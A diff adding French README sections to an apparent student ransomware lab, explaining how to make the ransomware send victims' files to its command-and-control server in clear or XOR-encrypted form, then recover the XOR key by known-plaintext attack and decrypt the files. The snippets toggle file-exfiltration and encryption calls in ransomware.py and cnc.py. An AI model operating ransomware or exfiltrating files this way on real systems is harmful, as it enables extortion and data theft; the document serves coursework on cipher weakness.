@@ -65,6 +65,63 @@ cd /root/ransomware
 python3 ransomware.py
 ```
 
+### Crack du chiffrement XOR avec l'attaque par texte clair
+
+## Récupération des données non chiffrées de la victime
+Comme évoqué plus haut, une attaque par texte clair est possible. Pour cela, il faudra récupérer dans un premier temps récupérer les données non chiffrées de la victime. Pour cela, de modifier quelques lignes de code dans le fichier `ransomware.py` :
+
+```python
+secret_manager.leak_files(files) # send files to cnc for decryption demonstration
+secret_manager.xorfiles(files) # XOR encryption
+#secret_manager.leak_files(files) # send files to cnc
+#secret_manager.aes_cbc_files(files, 0) # AES CBC
+```
+
+Les fichiers reçus sur le CNC seront alors écrits en clair dans le dossier `/token/`
+
+## Récupération des données chiffrées de la victime
+
+Pour récupérer les données chiffrées de la victime, il suffit de modifier quelques lignes de code dans le fichier `ransomware.py` :
+
+```python
+secret_manager.xorfiles(files) # XOR encryption
+secret_manager.leak_files(files) # send files to cnc for decryption demonstration
+#secret_manager.leak_files(files) # send files to cnc
+#secret_manager.aes_cbc_files(files, 0) # AES CBC
+```
+
+Il faudra aussi modifier le fichier `cnc.py` pour que le serveur puisse récupérer les données chiffrées :
+
+```python
+# save the token, salt and the file
+#self.save_b64(token, data, filename)
+
+# same but with encrypted data
+self.save_b64_encrypted(token, data, filename)
+```
+
+Les fichiers reçus sur le CNC seront alors écrits chiffrés dans le dossier `/token/`
+
+## Retrouver la clé de chiffrement
+
+Pour retrouver la clé de chiffrement, nous allons prendre un fichier clair portant le même nom que le fichier chiffré. Ensuite, il faudra exécuter dans `/sources/` le script `xor_cipher_attack.py` avec la commande suivante :
+
+```bash
+python3 xor_cipher_attack.py <fichier_chiffre.txt> <fichier_clair.txt>
+```
+
+Un fichier `key.bin` sera alors créé dans le dossier `/sources/` contenant la clé de chiffrement.
+
+## Déchiffrement des données
+
+Pour déchiffrer les données, il faudra alors exécuter dans `/sources/` le script `xor_file_unlocker.py` avec la commande suivante :
+
+```bash
+python3 xor_file_unlocker.py <fichier_clé> <fichier_a_dechiffrer>
+```
+
+Le fichier déchiffré sera alors écrit dans le dossier `/sources/` avec le nom `<fichier_a_dechiffrer>`, écrasant ainsi le fichier chiffré.
+
 ## Réponses aux questions
 
 ### Q1 : Quelle est le nom de l'algorithme de chiffrement ? Est-il robuste et pourquoi ?
